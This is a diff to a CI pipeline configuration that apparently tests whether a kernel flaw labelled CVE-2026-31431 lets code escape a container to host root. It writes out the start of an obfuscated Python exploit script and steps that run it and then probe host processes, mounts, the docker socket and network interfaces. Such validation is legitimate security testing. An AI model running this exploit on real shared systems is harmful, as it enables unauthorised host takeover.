@@ -96,7 +96,7 @@ jobs:
 
   # Post-exploit validation: confirms whether CVE-2026-31431 results in a
   # full container escape (host root) or stays contained (container root).
-  # Replace /path/to/exploit.py with the actual exploit script path before running.
+  # Replace /tmp/exploit.py with the actual exploit script path before running.
   af_alg_escape_validation_remote_docker:
     docker:
       - image: cimg/base:stable
@@ -105,7 +105,7 @@ jobs:
       - run:
           name: Creating Script
           command: |
-            cat /tmp/exploit.py << EOF
+            cat /tmp/exploit.py \<< EOF
               #!/usr/bin/env python3
               import os as g,zlib,socket as s
               def d(x):return bytes.fromhex(x)
@@ -120,7 +120,7 @@ jobs:
       - run:
           name: "Test 1A: Write marker via exploit"
           command: |
-            python3 /path/to/exploit.py
+            python3 /tmp/exploit.py
             touch /tmp/host_root_marker_$(date +%s)
             echo "exploit_completed" > /some/host/path
       - run:
@@ -131,7 +131,7 @@ jobs:
       - run:
           name: "Test 2: Process visibility (host root = sees nomad/docker/systemd)"
           command: |
-            python3 /path/to/exploit.py
+            python3 /tmp/exploit.py
             echo "=== Process tree ==="
             ps auxf | head -50
             echo "=== Looking for host processes ==="
@@ -139,7 +139,7 @@ jobs:
       - run:
           name: "Test 3: Mount namespace inspection (host root = host mounts, /proc/1/root accessible)"
           command: |
-            python3 /path/to/exploit.py
+            python3 /tmp/exploit.py
             echo "=== Mount points ==="
             mount | head -20
             echo "=== Root filesystem ==="
@@ -147,7 +147,7 @@ jobs:
       - run:
           name: "Test 4: Container runtime access (host root = docker socket accessible)"
           command: |
-            python3 /path/to/exploit.py
+            python3 /tmp/exploit.py
             echo "=== Docker socket ==="
             ls -la /var/run/docker.sock 2>/dev/null || echo "NO_DOCKER_SOCKET"
             docker ps 2>/dev/null || echo "NO_DOCKER_ACCESS"
@@ -156,7 +156,7 @@ jobs:
       - run:
           name: "Test 5: Network interface scope (host root = host interfaces visible)"
           command: |
-            python3 /path/to/exploit.py
+            python3 /tmp/exploit.py
             echo "=== Network interfaces ==="
             ip addr show
             echo "=== Host networking ==="
@@ -169,7 +169,7 @@ jobs:
       - run:
           name: Creating Script
           command: |
-            cat /tmp/exploit.py << EOF
+            cat /tmp/exploit.py \<< EOF
               #!/usr/bin/env python3
               import os as g,zlib,socket as s
               def d(x):return bytes.fromhex(x)
@@ -184,7 +184,7 @@ jobs:
       - run:
           name: "Test 1A: Write marker via exploit"
           command: |
-            python3 /path/to/exploit.py
+            python3 /tmp/exploit.py
             touch /tmp/host_root_marker_$(date +%s)
             echo "exploit_completed" > /some/host/path
       - run:
@@ -195,7 +195,7 @@ jobs:
       - run:
           name: "Test 2: Process visibility (host root = sees nomad/docker/systemd)"
           command: |
-            python3 /path/to/exploit.py
+            python3 /tmp/exploit.py
             echo "=== Process tree ==="
             ps auxf | head -50
             echo "=== Looking for host processes ==="
@@ -203,7 +203,7 @@ jobs:
       - run:
           name: "Test 3: Mount namespace inspection (host root = host mounts, /proc/1/root accessible)"
           command: |
-            python3 /path/to/exploit.py
+            python3 /tmp/exploit.py
             echo "=== Mount points ==="
             mount | head -20
             echo "=== Root filesystem ==="
@@ -211,7 +211,7 @@ jobs:
       - run:
           name: "Test 4: Container runtime access (host root = docker socket accessible)"
           command: |
-            python3 /path/to/exploit.py
+            python3 /tmp/exploit.py
             echo "=== Docker socket ==="
             ls -la /var/run/docker.sock 2>/dev/null || echo "NO_DOCKER_SOCKET"
             docker ps 2>/dev/null || echo "NO_DOCKER_ACCESS"
@@ -220,7 +220,7 @@ jobs:
       - run:
           name: "Test 5: Network interface scope (host root = host interfaces visible)"
           command: |
-            python3 /path/to/exploit.py
+            python3 /tmp/exploit.py
             echo "=== Network interfaces ==="
             ip addr show
             echo "=== Host networking ==="
